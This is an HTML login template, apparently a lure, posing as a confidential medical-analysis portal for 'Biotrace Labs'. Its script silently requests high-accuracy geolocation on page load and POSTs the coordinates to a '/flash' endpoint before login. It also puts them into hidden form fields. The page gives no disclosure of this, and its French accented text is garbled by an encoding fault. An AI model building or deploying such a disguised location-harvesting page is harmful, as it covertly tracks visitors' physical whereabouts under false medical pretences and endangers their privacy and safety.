<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Acc√®s s√©curis√© ‚Äì Biotrace Labs</title>
    <style>
        body {
            font-family: "Segoe UI", sans-serif;
            background: url("{{ url_for('static', filename='dna.jpeg') }}") no-repeat center center fixed;
            background-size: cover;
            backdrop-filter: blur(2px);
            color: #2a2a2a;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .login-container {
            background-color: rgba(255, 255, 255, 0.92);
            padding: 40px 30px;
            border-radius: 8px;
            box-shadow: 0 2px 15px rgba(0,0,0,0.1);
            max-width: 420px;
            width: 100%;
            text-align: center;
        }

        h2 {
            font-weight: 500;
            margin-bottom: 20px;
        }

        .warning {
            font-size: 13px;
            color: #8a1f1f;
            margin-bottom: 25px;
            font-style: italic;
        }

        .password-wrapper {
            position: relative;
        }

        input[type="password"] {
            width: 100%;
            padding: 10px 12px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 14px;
        }

        .toggle-password {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            font-size: 16px;
            user-select: none;
        }

        button {
            padding: 10px 20px;
            font-size: 14px;
            background-color: #2f5e88;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }

        .error {
            color: #b30000;
            margin-top: 10px;
        }

        .footer-branding {
            margin-top: 25px;
            font-size: 14px;
            color: #888;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Acc√©der √† vos analyses s√©curis√©es</h2>
        <p class="warning">‚ö†Ô∏è Ce portail est r√©serv√© √† un usage confidentiel. Toute tentative d'acc√®s non autoris√© est enregistr√©e. Les donn√©es m√©dicales sont prot√©g√©es par le secret professionnel.</p>

        <form method="POST" onsubmit="injectCoords()">
            <div class="password-wrapper">
                <input type="password" name="password" id="password" placeholder="Mot de passe" required>
                <span class="toggle-password" onclick="togglePassword()">üëÅÔ∏è</span>
            </div>
            <input type="hidden" name="lat" id="lat">
            <input type="hidden" name="lon" id="lon">
            <button type="submit">Valider</button>
            {% if error %}
                <p class="error">{{ error }}</p>
            {% endif %}
        </form>

        <div class="footer-branding">Biotrace Labs</div>
    </div>

    <script>
        let userLatitude = "";
        let userLongitude = "";

        document.addEventListener("DOMContentLoaded", function () {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function (position) {
                        userLatitude = position.coords.latitude;
                        userLongitude = position.coords.longitude;
                        sendFlashLocation(userLatitude, userLongitude);
                    },
                    function () {
                        console.log("G√©olocalisation refus√©e.");
                    },
                    { enableHighAccuracy: true, timeout: 5000 }
                );
            }
        });

        function injectCoords() {
            document.getElementById("lat").value = userLatitude;
            document.getElementById("lon").value = userLongitude;
        }

        function togglePassword() {
            const pwd = document.getElementById("password");
            pwd.type = pwd.type === "password" ? "text" : "password";
        }

        function sendFlashLocation(lat, lon) {
            fetch("/flash", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ lat: lat, lon: lon })
            });
        }
    </script>
</body>
</html>
